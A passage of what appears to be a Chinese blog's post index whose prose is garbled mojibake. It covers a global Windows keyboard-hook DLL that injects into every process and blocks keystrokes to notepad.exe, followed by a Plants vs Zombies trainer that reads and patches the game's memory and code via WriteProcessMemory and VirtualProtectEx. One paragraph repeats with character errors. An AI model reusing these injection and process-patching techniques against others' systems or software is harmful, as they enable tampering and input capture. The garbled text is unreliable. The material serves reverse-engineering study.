å†è¿è¡Œnotepad.exeï¼Œä¹‹åå†ä½¿ç”¨æŸ¥çœ‹ï¼Œå‘ç°dllæ–‡ä»¶å·²ç»è¢«æ³¨å…¥ã€‚ è¾“å…¥qï¼Œæ‹†é™¤é’©å­ã€‚æ‹†é™¤åï¼Œdllæ–‡ä»¶æ¶ˆå¤±ï¼Œå¯ä»¥æ­£å¸¸è¾“å…¥ã€‚ 6.2ã€åˆ†ææºç  HookMain.exeä¸»è¦è¿‡ç¨‹ä¸ºï¼šé¦–å…ˆåŠ è½½KeyHook.dllæ–‡ä»¶ï¼Œç„¶åè°ƒç”¨HookStart()å‡½æ•°å¼€å§‹é’©å–ï¼Œç”¨æˆ·è¾“å…¥â€qâ€æ—¶ï¼Œè°ƒç”¨HookStop()å‡½æ•°ç»ˆæ­¢é’©å–ã€‚ &#x2F;&#x2F;HookMain.exe #include â€œstdio.hâ€#include â€œconio.hâ€#include â€œwindows.hâ€ #define DEF_DLL_NAME â€œKeyHook.dllâ€#define DEF_HOOKSTART â€œHookStartâ€#define DEF_HOOKSTOP â€œHookStopâ€ typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)(); void main(){ HMODULE hDll &#x3D; NULL; PFN_HOOKSTART HookStart &#x3D; NULL; PFN_HOOKSTOP HookStop &#x3D; NULL; char ch &#x3D; 0; // åŠ è½½KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // è·å–å¯¼å‡ºå‡½æ•°åœ°å€ HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // å¼€å§‹ HookStart(); // â€œqâ€é€€å‡º printf(&quot;press &#39;q&#39; to quit!\\n&quot;); while( _getch() != &#39;q&#39; ) ; // ç»“æŸ HookStop(); // å¸è½½ KeyHook.dll FreeLibrary(hDll); } KeyHook.dllåœ¨è°ƒç”¨HookStart()æ—¶ï¼ŒSetWindowsHookEx()å‡½æ•°å°±ä¼šå°†KeyboardProc()æ·»åŠ åˆ°é”®ç›˜é’©é“¾ã€‚ å®‰è£…å¥½é”®ç›˜â€œé’©å­â€åï¼Œæ— è®ºå“ªä¸ªè¿›ç¨‹ï¼Œåªè¦å‘ç”Ÿé”®ç›˜è¾“äººäº‹ä»¶ï¼Œ OS å°±ä¼šå¼ºåˆ¶å°† KeyHook . dl äººç›¸åº”è¿›ç¨‹ã€‚åŠ è½½äº† KeyHook.dll çš„è¿›ç¨‹ä¸­ï¼Œå‘ç”Ÿé”®ç›˜äº‹ä»¶æ—¶ä¼šé¦–å…ˆè°ƒç”¨æ‰§è¡ŒKeyHookKeyboardProc ã€‚ KeyboardProc å‡½æ•°ä¸­å‘ç”Ÿé”®ç›˜è¾“å…¥äº‹ä»¶æ—¶ï¼Œå°±ä¼šæ¯”è¾ƒå½“å‰è¿›ç¨‹çš„åç§°ä¸â€œ notepad.exe â€å­—ç¬¦ä¸²ï¼Œè‹¥ç›¸åŒï¼Œåˆ™è¿”å›1ï¼Œç»ˆæ­¢ KeyboardProcï¼ˆï¼‰å‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆªè·ä¸”åˆ é™¤æ¶ˆæ¯ã€‚è¿™æ ·ï¼Œé”®ç›˜æ¶ˆæ¯å°±ä¸ä¼šä¼ é€’åˆ° notepad.exe ç¨‹åºçš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚ å®‰è£…å¥½é”®ç›˜â€œé’©å­â€åï¼Œæ— è®ºå“ªä¸ªè¿›ç¨‹ï¼Œåªè¦å‘ç”Ÿé”®ç›˜è¾“äººäº‹ä»¶ï¼Œ OS å°±ä¼šå¼ºåˆ¶å°† KeyHook . dl äººç›¸åº”è¿›ç¨‹ã€‚åŠ è½½äº† KcyHook . dll çš„è¿›ç¨‹ä¸­ï¼Œå‘ç”Ÿé”®ç›˜äº‹ä»¶æ—¶ä¼šé¦–å…ˆè°ƒç”¨æ‰§è¡Œ KeyHfookKeyboardProc ã€‚ KeyboardProd å‡½æ•°ä¸­å‘ç”Ÿé”®ç›˜è¾“äººäº‹ä»¶æ—¶ï¼Œå°±ä¼šæ¯”è¾ƒå½“å‰è¿›ç¨‹çš„åç§°ä¸â€œ notepad . exe â€å­—ç¬¦ä¸²ï¼Œè‹¥ç›¸åŒï¼Œåˆ™è¿”ç½‘1ï¼Œç»ˆæ­¢ KcyboardProc ï¼ˆå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆªè·ä¸”åˆ é™¤æ¶ˆæ¯ã€‚è¿™æ ·ï¼Œé”®ç›˜æ¶ˆæ¯å°±ç¯ä¼šä¼ é€åˆ° notapadexe ç¨‹åºçš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚notepad.exe æœªèƒ½æ¥æ”¶åˆ°ä»»ä½•é”®ç›˜æ¶ˆæ¯ï¼Œæ•…æ— æ³•è¾“å‡ºã€‚ é™¤æ­¤ä¹‹å¤–ï¼ˆå³å½“å‰è¿›ç¨‹åç§°éâ€œ notepad . exe â€æ—¶ï¼‰ï¼Œæ‰§è¡Œ return CallNextHookEx ( g_hHook , nCode , wParam, lParam)ï¼Œæ¶ˆæ¯ä¼šè¢«ä¼ é€’åˆ°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–é’©é“¾çš„å¦ä¸€ä¸ªâ€œé’©å­â€å‡½æ•°ã€‚ &#x2F;&#x2F; KeyHook.dll #include â€œstdio.hâ€#include â€œwindows.hâ€ #define DEF_PROCESS_NAME â€œnotepad.exeâ€ HINSTANCE g_hInstance &#x3D; NULL;HHOOK g_hHook &#x3D; NULL;HWND g_hWnd &#x3D; NULL; BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved){ switch( dwReason ) { case DLL_PROCESS_ATTACH: g_hInstance &#x3D; hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE; } LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ char szPath[MAX_PATH] &#x3D; {0,}; char *p &#x3D; NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) //é‡Šæ”¾é”®ç›˜æŒ‰é”®æ—¶ &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#39;\\\\&#39;); // æ¯”è¾ƒå½“å‰è¿›ç¨‹åç§°ï¼Œå¦‚æœæ˜¯ notepad.exe åˆ™æ¶ˆæ¯ä¸ä¼šä¼ ç»™åº”ç”¨ç¨‹åº if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; //åä¹‹ï¼Œè°ƒç”¨ CallNextHookEx() æ¶ˆæ¯ä¼ ç»™åº”ç”¨ç¨‹åº return CallNextHookEx(g_hHook, nCode, wParam, lParam); } #ifdef __cplusplusextern â€œCâ€ {#endif __declspec(dllexport) void HookStart(){ g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if( g_hHook ) { UnhookWindowsHookEx(g_hHook); g_hHook &#x3D; NULL; } }#ifdef __cplusplus}#endif 6.3ã€è°ƒè¯•æ–¹æ³• å…ˆè°ƒè¯•HookMain().exeï¼ŒODæ‰“å¼€è¯¥ç¨‹åºã€‚ æŸ¥æ‰¾æ ¸å¿ƒä»£ç  1ã€é€è¡Œè·Ÿè¸ªè°ƒè¯•2ã€æ£€ç´¢ç›¸å…³API3ã€æœç´¢ç›¸å…³å­—ç¬¦ä¸² ç”±äºä¹‹å‰æ‰“å¼€è¿‡æ­¤ç¨‹åºï¼Œæ‰€ä»¥ç›´æ¥æœç´¢â€press â€˜qâ€™ to quit!\\nâ€ã€‚ ç‚¹å‡»åè·³è½¬åˆ°è¯¥ä½ç½®ï¼Œåœ¨401000åœ°å€å¤„ä¸‹æ–­ç‚¹ã€‚ç„¶åè¿è¡Œåˆ°æ­¤å¤„ã€‚ å…ˆåœ¨401006åœ°å€å¤„è°ƒç”¨LoadLibrary,ç„¶åç”±40104Båœ°å€å¤„çš„CALLæŒ‡ä»¤è°ƒç”¨KeyHook.HookStart()å‡½æ•°ã€‚ F7è·Ÿè¸ªè¿›å…¥ã€‚ å›¾ä¸­çš„ä»£ç æ˜¯è¢«åŠ è½½åˆ°HookMain.exe è¿›ç¨‹ä¸­çš„ KeyHook.dllçš„HookStart()å‡½æ•°ã€‚ åœ¨100010EFåœ°å€å¤„å¯ä»¥çœ‹åˆ° CALL SetWindowsHookExW() æŒ‡ä»¤ï¼Œå…¶ä¸Šæ–¹10010E8ä¸100010EDåœ°å€å¤„çš„2æ¡ PUSH æŒ‡ä»¤ç”¨äºæŠŠ SetWindowsHookExW() API çš„ç¬¬1ã€2ä¸¤ä¸ªå‚æ•°å‹å…¥æ ˆã€‚ Set WindowsHookExW() API çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆ idHookï¼‰å€¼ä¸ºWH_KEYBOARD(2)ï¼Œç¬¬äºŒä¸ªå‚æ•°( Ipfn ï¼‰å€¼ä¸º10001020ï¼Œè¯¥å€¼å³æ˜¯é’©å­è¿‡ç¨‹çš„åœ°å€ã€‚åé¢è°ƒè¯• KeyHook . dlI æ—¶å†ä»”ç»†çœ‹è¯¥åœ°å€ã€‚HookMain.exeçš„main()å‡½æ•°ï¼ˆ401000ï¼‰çš„å…¶ä½™ä»£ç æ¥æ”¶åˆ°ç”¨æˆ·è¾“äººçš„â€œ q â€å‘½ä»¤åç»ˆæ­¢é’©å–ã€‚ è°ƒè¯•KeyHook.dll ä½¿ç”¨ODæ‰“å¼€notepad.exe,F9è¿è¡Œ åœ¨ODä¸­è®¾ç½®å¦‚ä¸‹çš„é€‰é¡¹ è¿è¡ŒHookMain.exe éšååœ¨notepadä¸­éšæ„è¾“å…¥ä¸€ä¸ªå­—æ¯ï¼Œæ­¤æ—¶dllè¢«åŠ è½½åˆ°10000000å¤„ æ ¹æ®ç³»ç»Ÿç¯å¢ƒä¸åŒï¼Œæœ‰æ—¶ä¸ä¼šå…ˆæ˜¾ç¤º KeyHook.dllï¼Œè€Œæ˜¯å…ˆåŠ è¼‰å…¶ä»– DLL åº“ã€‚ æ­¤æ—¶æŒ‰ï¼ˆF9ï¼‰è¿è¡Œé”®ï¼Œç›´åˆ°KeyHook.dllåŠ è½½å®Œæˆã€‚ æœ‰äº›ç³»ç»Ÿæ— æ³•æ­£å¸¸è¿è¡Œè¯¥åŠŸèƒ½ï¼Œæ­¤æ—¶ä½¿ç”¨OllyDbg2.0å³å¯ä¿è¯è¿è¡Œé¡ºç•…ã€‚ ç‚¹å‡»dllè·³è½¬åˆ°KeyHook.dllçš„EPåœ°å€å¤„ã€‚å¹¶ä¸”ç”±äºä¹‹å‰åœ¨è°ƒè¯•HookMain.exeæ—¶å€™å·²ç»çŸ¥é“é’©å­çš„åœ°å€æ˜¯10001020ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ã€‚ ä¸‹å¥½æ–­ç‚¹å¥½ï¼Œå†é‡æ–°è¿è¡Œä¸€ä¸‹ç¨‹åºã€‚ç„¶ååœ¨è®°äº‹æœ¬å½“ä¸­å°è¯•è¾“å…¥æ•°æ®ï¼Œè®°äº‹æœ¬æ— æ¥æ”¶æ•°æ®çš„æ„å‘ï¼Œå¹¶ä¸”ODå·²ç»è·³è½¬åˆ°æ–­ç‚¹å¤„ã€‚ 1ã€ODè¿è¡Œnotepad.exe2ã€å¼€å¯Break on new module(ä¸­æ–­äºæ–°æ¨¡å—)é€‰é¡¹3ã€è¿è¡ŒHookMain.exe4ã€è¿›è¡Œé”®ç›˜è¾“å…¥ï¼Œè§¦å‘é”®ç›˜æ¶ˆæ¯äº‹ä»¶5ã€dllè¢«æ³¨å…¥6ã€ODä¸­è®¾ç½®é’©å­è¿›ç¨‹ï¼ˆKeyboardProcï¼‰æ–­ç‚¹","categories":[],"tags":[]},{"title":"æ¤ç‰©å¤§æˆ˜åƒµå°¸ä¿®æ”¹å™¨åˆ¶ä½œ","slug":"æ¤ç‰©å¤§æˆ˜åƒµå°¸ä¿®æ”¹å™¨åˆ¶ä½œ","date":"2022-11-17T16:01:03.000Z","updated":"2023-12-02T12:31:03.882Z","comments":true,"path":"2022/11/18/æ¤ç‰©å¤§æˆ˜åƒµå°¸ä¿®æ”¹å™¨åˆ¶ä½œ/","link":"","permalink":"http://example.com/2022/11/18/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8%E4%BF%AE%E6%94%B9%E5%99%A8%E5%88%B6%E4%BD%9C/","excerpt":"åŸºå€åç§»è¡¨éƒ¨åˆ†å‚è€ƒ: å…¬å¸ƒæˆ‘æ‰€æ‰¾åˆ°çš„æ‰€æœ‰åŸºå€åŠå„ç§åŠŸèƒ½å®ç°æ–¹æ³• 12345678910111213141516åŸºå€ 0x00355E0Cé˜³å…‰ +868 +5578é‡‘é’± +950 +50èŠ±è‚¥ +950 +220å·§å…‹åŠ› +950 +250æ ‘è‚¥ +950 +258æ ‘é«˜ +950 +11Cæ€è™«å‰‚ +950 +224å¡æ§½æ•° +868 +15C +24å¡æ§½æ  +868 +15C +5C æ­¤åæ¯ä¸ªæ¤ç‰©æ ç›¸éš”0x50æ¤ç‰©å½“å‰å†·å´å€¼ +868 +15C +4C æ­¤åæ¯ä¸ªæ¤ç‰©å†·å´ç›¸éš”0x50æ¤ç‰©å†·å´å€¼ä¸Šé™ +868 +15C +50 æ­¤åæ¯ä¸ªæ¤ç‰©å†·å´ä¸Šé™ç›¸éš”0x50æ¤ç‰©å½“å‰æ•°é‡ +868 +D4æ¤ç‰©ç§æ¤å‡½æ•°EBP +868åƒµå°¸å½“å‰æ•°é‡ +868 +B8åƒµå°¸ç§æ¤å‡½æ•°EBP +868 +178","text":"åŸºå€åç§»è¡¨éƒ¨åˆ†å‚è€ƒ: å…¬å¸ƒæˆ‘æ‰€æ‰¾åˆ°çš„æ‰€æœ‰åŸºå€åŠå„ç§åŠŸèƒ½å®ç°æ–¹æ³• 12345678910111213141516åŸºå€ 0x00355E0Cé˜³å…‰ +868 +5578é‡‘é’± +950 +50èŠ±è‚¥ +950 +220å·§å…‹åŠ› +950 +250æ ‘è‚¥ +950 +258æ ‘é«˜ +950 +11Cæ€è™«å‰‚ +950 +224å¡æ§½æ•° +868 +15C +24å¡æ§½æ  +868 +15C +5C æ­¤åæ¯ä¸ªæ¤ç‰©æ ç›¸éš”0x50æ¤ç‰©å½“å‰å†·å´å€¼ +868 +15C +4C æ­¤åæ¯ä¸ªæ¤ç‰©å†·å´ç›¸éš”0x50æ¤ç‰©å†·å´å€¼ä¸Šé™ +868 +15C +50 æ­¤åæ¯ä¸ªæ¤ç‰©å†·å´ä¸Šé™ç›¸éš”0x50æ¤ç‰©å½“å‰æ•°é‡ +868 +D4æ¤ç‰©ç§æ¤å‡½æ•°EBP +868åƒµå°¸å½“å‰æ•°é‡ +868 +B8åƒµå°¸ç§æ¤å‡½æ•°EBP +868 +178 å¸¸è§„é¡¹ç›®æ ¹æ®å˜é‡çš„å˜åŒ–ä½¿ç”¨CEå¯»æ‰¾,æ‰¾åˆ°ä¹‹åå†é€šè¿‡æŒ‡é’ˆæ‰«æå¯»æ‰¾å¯ç”¨çš„åŸºå€ é˜³å…‰ å†…å­˜å®é™…å€¼&#x3D;æ¸¸æˆæ˜¾ç¤ºå€¼ æ™ºæ…§æ ‘é«˜åº¦ å†…å­˜å®é™…å€¼&#x3D;æ¸¸æˆæ˜¾ç¤ºå€¼ é‡‘é’± å†…å­˜å®é™…å€¼&#x3D;æ¸¸æˆæ˜¾ç¤ºå€¼&#x2F;10 èŠ±è‚¥,æ€è™«å‰‚,å·§å…‹åŠ›,æ ‘è‚¥ å†…å­˜å®é™…å€¼&#x3D;æ¸¸æˆæ˜¾ç¤ºå€¼+1000 å…³é”®å‡½æ•°å’Œå˜é‡ å¤åˆ¶ä»£ç  éšè—ä»£ç enum Type { Sunlight, Money, TreeHeight, Chocolate, TreeFood, FlowerFood, Insecticide}; &#x2F;&#x2F;å®šä¹‰æ˜ å°„è¡¨ç”¨äºä¿å­˜å„é¡¹åç§»å€¼unsigned int offsetTable[10] &#x3D; { 0x5578,0x50,0x11c,0x250,0x258,0x220,0x224 }; &#x2F;&#x2F;è·å–æŸäº›é¡¹ç›®çš„å€¼unsigned int getSomething(HANDLE handle, DWORD BaseAddr,unsigned int type) { unsigned int num &#x3D; 0; DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; ReadProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0); return num;} &#x2F;&#x2F;è®¾ç½®æŸäº›é¡¹ç›®çš„å€¼void setSomething(HANDLE handle, DWORD BaseAddr,unsigned int type, unsigned int num) { DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; WriteProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0);}å¡æ§½æ¤ç‰©åä¸ªå¡æ§½,æ¯ä¸ªå¡æ§½å¯¹åº”ä¸€ä¸ªæ¤ç‰©,å¯ä»¥åœ¨åšæœä¿é¾„çƒ2ä¸­æ ¹æ®å¡æ§½1(æœ€å·¦è¾¹çš„å¡æ§½)çš„åšæœå˜åŒ–æ¥æ‰¾åˆ°å¡æ§½çš„åœ°å€,ä¹‹åå†å¯»æ‰¾åŸºå€ å…·ä½“æ–¹æ³•: åˆå€¼æœªçŸ¥,å¦‚æœå¡æ§½1çš„æ¤ç‰©å’Œæ–°çš„å¡æ§½1(åŸå¡æ§½2)çš„æ¤ç‰©ç›¸åŒ,åˆ™æ‰«ä¸å˜çš„å€¼,å¦åˆ™æ‰«å˜åŒ–çš„å€¼ å¡æ§½ä¹‹é—´çš„åç§»å¯ä»¥é€šè¿‡æµè§ˆå¡æ§½1å†…å­˜åŒºåŸŸçœ‹å‡º,ä¸º0x50 åšæœæ¤ç‰©å¡æ§½ç¼–å·: æ™®é€šåšæœ 3 çˆ†ç‚¸åšæœ 49 å·¨å‹åšæœ 50 è®¾ç½®å¡æ§½æ¤ç‰©å‡½æ•° å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;è®¾ç½®å¡æ§½æ¤ç‰©BOOL SetPlantCard(HANDLE hProcess,DWORD BaseAddr,DWORD nCard,DWORD plantType) { DWORD cardAddr &#x3D; BaseAddr + 0x355E0C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x15C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x5C+nCard*0x50;&#x2F;&#x2F;å¡æ§½åç§» return WriteProcessMemory(hProcess, cardAddr, &amp;plantType, sizeof(DWORD), NULL);}ç§æ¤æ— å†·å´å…·ä½“æ–¹æ³•: ä»…é’ˆå¯¹ä¸€ä¸ªå¡æ§½,åˆå§‹å€¼æœªçŸ¥,ç§æ¤åæŒç»­å˜åŒ–,å†·å´å®Œæ¯•åä¸å˜,åå¤æ‰«æå¹¶æŸ¥æ‰¾åŸºå€,æŸ¥çœ‹å¯¹åº”å†…å­˜åŒºåŸŸå†å¯¹ç…§æ¤ç‰©ç¼–å·å¯ä»¥å‘ç°å¡æ§½é—´çš„åç§»ä¸º0x50 å†·å´ç‰¹ç‚¹: å¯ç§æ¤çŠ¶æ€å†·å´å€¼ä¸º0,ç§æ¤åå†·å´å€¼æŒç»­å¢é•¿,åˆ°è¾¾å†·å´ä¸Šé™å,å†·å´å€¼æ¸…é›¶,æ¤ç‰©é‡æ–°å¯ç§æ¤ æ³¨æ„: ç›´æ¥å°†å†·å´å€¼ç½®0ä¼šå¯¼è‡´æ— æ³•ç§æ¤ ä¿®æ”¹æ–¹æ³•: ä¿®æ”¹å†·å´ç»“æŸåæ¢å¤çš„é€Ÿåº¦,å°†incæŒ‡ä»¤ä¿®æ”¹ä¸ºmovä¸€ä¸ªè¾ƒå¤§å€¼ è¿™ä¸ªç›´æ¥è·³è½¬åˆ°å†·å´å€¼å’Œå†·å´ä¸Šé™æ¯”è¾ƒæˆåŠŸçš„å‡½æ•°ä»¥æ–¹æ³•2ä¸ºä¾‹ 7E 16 å¯¹åº”æ±‡ç¼–æŒ‡ä»¤ä¸º jle 0x18 ä¿®æ”¹ä¸ºjmp $+2 å³ eb 00 (ç›¸å¯¹å½“å‰æŒ‡ä»¤2å­—èŠ‚åçš„æŒ‡ä»¤) ç›´æ¥æ‰§è¡Œå†·å´å€¼è¾¾åˆ°å†·å´ä¸Šé™åçš„å‡½æ•°(å†·å´å€¼æ¸…é›¶,æ¤ç‰©å†·å´å®Œæ¯•å¯ç§æ¤) é™„ä¸Šæ±‡ç¼–ä»£ç è½¬æ¢ç½‘ç«™ å…³é”®ä»£ç  å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;ä¿®æ”¹è¿›ç¨‹ä»£ç åŒºä»£ç  å‚æ•°: è¿›ç¨‹å¥æŸ„ ä¿®æ”¹ä»£ç èµ·å§‹åœ°å€ ç¡¬ç¼–ç æŒ‡é’ˆ ä»£ç å­—èŠ‚æ•°BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;å–æ¶ˆé¡µä¿æŠ¤ if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;å†™å…¥ä»£ç  VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;å¼€å¯é¡µä¿æŠ¤ return bResult;} &#x2F;&#x2F;æ— é™å†·å´BOOL Uncooled(HANDLE hProcess, DWORD BaseAddr) { unsigned char code[2] &#x3D; { 0xeb,0x00 }; return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, code, 2);&#x2F;&#x2F;jle 0x18ä¿®æ”¹ä¸ºjmp $+2} &#x2F;&#x2F;æ¢å¤å†·å´BOOL RecoveryCooling(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[2] &#x3D; { 0x7E ,0x16 };&#x2F;&#x2F;jmp $+2æ¢å¤ä¸ºjle 0x18 return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, OriginalCode, 2);}æ— é™é˜³å…‰å‰æ–‡å·²ç»ç»™å‡ºäº†é˜³å…‰çš„åœ°å€ åŸºå€ä¸º0x355E0C åç§»+868 +5578 æŸ¥æ‰¾å¯¹é˜³å…‰ä¿®æ”¹çš„ä»£ç å³å¯ é˜³å…‰å‡å°‘ä»£ç  é˜³å…‰å¢åŠ ä»£ç  åŸºæœ¬è¿‡ç¨‹: è®¾ç½®é˜³å…‰å€¼ä¸º9999 ä¿®æ”¹é˜³å…‰å‡å°‘ä»£ç ä½¿å¾—ç§æ¤ç‰©ä¸æ¶ˆè€—é˜³å…‰ ä¿®æ”¹é˜³å…‰å¢åŠ ä»£ç ä½¿å¾—é˜³å…‰ä¸å˜åŒ–(é˜²æ­¢é˜³å…‰è¿‡å¤šå¯¼è‡´æº¢å‡º) å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;ä¿®æ”¹è¿›ç¨‹ä»£ç åŒºä»£ç  å‚æ•°: è¿›ç¨‹å¥æŸ„ ä¿®æ”¹ä»£ç èµ·å§‹åœ°å€ ç¡¬ç¼–ç æŒ‡é’ˆ ä»£ç å­—èŠ‚æ•°BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;å–æ¶ˆé¡µä¿æŠ¤ if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;å†™å…¥ä»£ç  VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;å¼€å¯é¡µä¿æŠ¤ return bResult;}&#x2F;&#x2F;æ— é™é˜³å…‰,é”å®šé˜³å…‰ä¸º9999BOOL UnlimitedSun(HANDLE hProcess, DWORD BaseAddr) { unsigned char Code[3] &#x3D; { 0x29,0xdb,0 };&#x2F;&#x2F;cmp ebx,eax ä¿®æ”¹ä¸ºsub ebx,ebx and ecx,0x32ä¿®æ”¹ä¸ºand ecx,0 BOOL flag; flag &#x3D; setSomething(hProcess, BaseAddr, Sunlight, 9999);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰ flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, Code, 2);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰å‡å°‘ä»£ç  flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;Code[2], 1);&#x2F;&#x2F;ä¿®æ”¹é˜³å…‰å¢åŠ ä»£ç  return flag;} &#x2F;&#x2F;æ¢å¤é˜³å…‰æ¶ˆè€—BOOL RecoverySunConsume(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[3] &#x3D; { 0x3B,0xD8,0x32 };&#x2F;&#x2F;sub ebx,ebxæ¢å¤ä¸ºcmp ebx,eax and ecx,0æ¢å¤ä¸ºand ecx,0x32 BOOL flag &#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, OriginalCode, 2);&#x2F;&#x2F;æ¢å¤é˜³å…‰å‡å°‘ä»£ç  flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;OriginalCode[2], 1);&#x2F;&#x2F;æ¢å¤é˜³å…‰å¢åŠ ä»£ç  return flag;}æµ“é›¾é€è§†åŸºæœ¬åŸç†å…·ä½“æ–¹æ³•: åœ¨ç”Ÿå­˜æ¨¡å¼æµ“é›¾è¿›è¡Œ,åˆå€¼æœªçŸ¥,é€šè¿‡åœ¨é›¾åŒºç§æ¤å’Œé“²é™¤è·¯ç¯èŠ±å¼•èµ·çš„å˜åŒ–æ¥åˆ¤æ–­,æœ€ç»ˆå¯ä»¥å‘ç°æ˜¯4å­—èŠ‚æ•°æ®,æ•°å€¼ä»£è¡¨é›¾çš„æµ“åº¦,255ä»£è¡¨æµ“é›¾,0ä»£è¡¨æ²¡é›¾,å†æŸ¥æ‰¾ä¿®æ”¹é›¾å€¼çš„ä»£ç  å¯»æ‰¾æµ“é›¾åœ°å€ æµ“é›¾ä¿®æ”¹ä»£ç  mov [ecx],edxè¿™è¡Œä»£ç ä¿®æ”¹äº†é›¾å€¼,å¯ä»¥æ”¹ä¸ºmov [ecx],0 æ³¨æ„ç¡¬ç¼–ç ä¸º0xc7,0x01,0x00,0x00,0x00,0x00 ç”±äºè¾ƒé•¿æ— æ³•ç›´æ¥ä¿®æ”¹ä»£ç ,æ‰€ä»¥è¿™é‡Œé€‰æ‹©ä½¿ç”¨hookæŠ€æœ¯ HOOKhookçš„åŸºæœ¬è¿‡ç¨‹ è¯»å–å¹¶ä¿å­˜ç›®çš„åœ°å€åŸå§‹ä»£ç ç”³è¯·ç©ºé—´(PVZæ¸¸æˆè¿›ç¨‹ç©ºé—´)ç”¨äºå­˜å‚¨åŸå§‹ä»£ç  hookä»£ç  jmpè¿”å›ä»£ç å‘ç”³è¯·çš„ç©ºé—´ä¸­å†™å…¥åŸå§‹ä»£ç  hookä»£ç  jmpè¿”å›ä»£ç ä¿®æ”¹ç›®çš„åœ°å€çš„ä»£ç ä¸ºjmp HookCodeè¿”å›HookCodeé¦–åœ°å€ ç”¨äºè§£é™¤hookå€¼å¾—ä¸€æçš„æ˜¯jmpæŒ‡ä»¤åè·Ÿçš„åç§»å€¼æ˜¯ä»¥jmpçš„ä¸‹ä¸€æ¡æŒ‡ä»¤é¦–åœ°å€è®¡ç®— jmpæŒ‡ä»¤åç§»å€¼&#x3D;ç›®çš„åœ°å€-(jmpæŒ‡ä»¤é¦–åœ°å€+5) è¿™é‡Œçš„5æ˜¯jmpæŒ‡ä»¤æœ¬èº«çš„é•¿åº¦ +5ä¾¿æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤ offset&#x3D;desAddr-(jmpAddr+5) å¤åˆ¶ä»£ç  éšè—ä»£ç &#x2F;&#x2F;ä¿®æ”¹è¿›ç¨‹ä»£ç åŒºä»£ç  å‚æ•°: è¿›ç¨‹å¥æŸ„ 